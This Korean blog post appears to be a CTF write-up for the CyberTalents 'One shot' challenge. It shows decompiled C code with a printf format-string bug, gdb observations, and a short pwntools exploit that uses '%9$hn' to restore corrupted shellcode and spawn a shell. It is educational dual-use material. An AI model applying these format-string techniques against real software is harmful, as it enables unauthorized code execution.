---
title: "CyberTalents One shot"
date: 2020-1-8
tags: [CyberTalents]
categories: [CyberTalents]
---

메인은 간단하게 addr은 mmap으로 `0xF77FF000` 주소에 값을 메모리 매핑해주고 그 주소에서 mprotect로 권한을 준다. 그리고 `strncpy` 함수로 shellcode를 addr에 shellcode 길이만큼 복사해준다. 

근데 addr 참조한 곳에 첫번째를 1로 바꾸고 다음 주소를 2로 바꿔준다.

그리고 밑에서는 s변수에 입력받고 `pritnf(&s);` 해주는데 이곳에서 fsb가 터진다. 

밑에서 이 addr을 실행해주는데 shellcode를 보면 쉘을 띄워주는 쉘코드가 들어있다.

`*addr =1 ` , `*addr[1] = 2` 이런식으로 되어있어서 shellcode를 실행해도 쉘이 안 뜬다.

그래서 이곳을 fsb를 이용해서 원래 쉘코드로 바꿔주면 된다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // eax
  _BYTE *addr; // [esp+14h] [ebp-114h]
  int v6; // [esp+18h] [ebp-110h]
  char s; // [esp+1Ch] [ebp-10Ch]
  unsigned int v8; // [esp+11Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  addr = mmap(0xF77FF000, 0x20u, 0, 34, 0, 0);
  v6 = mprotect(addr, 32u, 7);
  if ( addr == -1 || v6 == -1 )
  {
    puts("mmap() or mprotect() failed. Please contact admin.");
    exit(-1);
  }
  v3 = strlen(shellcode);
  strncpy(addr, shellcode, v3);
  *addr = 1;
  addr[1] = 2;
  printf("you have only one shot: ");
  fgets(&s, 255, stdin);
  printf(&s);
  (addr)();
  return 0;
}
```

shellcode는 이렇게 박혀있다.

![](https://user-images.githubusercontent.com/32904385/71976142-f3fa4f00-3258-11ea-8393-d89960dd8f19.png)

strncpy 전에 보면 아까 매핑했던 주소에 `0xf77ff000` 이렇게 매핑되어있는 것을 볼 수 있다.

![](https://user-images.githubusercontent.com/32904385/71976145-f492e580-3258-11ea-8001-5b293be0ecb0.png)

그리고 strncpy 이후 보면 이런식으로 shellcode가 들어간 것을 볼 수 있다.

![](https://user-images.githubusercontent.com/32904385/71976146-f5c41280-3258-11ea-9284-41e7f301f8a4.png)

`*addr = 1` , `*addr[1] = 2` 을 실행한 후 주소에 매핑된 값을 보면 이렇게 1과2가 들어간게 보인다.

![](https://user-images.githubusercontent.com/32904385/71976148-f65ca900-3258-11ea-965f-e460b3678a83.png)

fgets에서 `AAAA %p %p %p %p %p %p %p %p %p %p %p %p` 이렇게 넣으면 `printf(&s)` 에서 `AAAA 0xff 0xf7fbf5a0 (nil) 0xffffd2c4 0xffffd2c0 0x3 0xffffd444 0xf7ffd000 0xf77ff000 (nil) 0x41414141`

이렇게 출력되는데 buf는 offset 11 (esp + 44)위치에 있고 offset 9 (esp + 36)를 보면 `0xf77ff000` 가 있다. 

이 주소에 값을 덮어쓰면 shellcode를 실행할때 제대로 쉘을 띄울 수 있을 것이다. 

![](https://user-images.githubusercontent.com/32904385/71976150-f78dd600-3258-11ea-9af3-67fa07871348.png)

그냥 gdb로 잘 보면 풀리는 문제였다 ㅎㅎ...

> exploit.py

```python
from pwn import *

e = ELF('./oneshot')
p = process('./oneshot')
#p = remote('35.222.174.178',31339)

payload = '%{}c'.format(0xc031)
payload += '%9$hn'

p.sendlineafter(':',payload)

p.interactive()
```

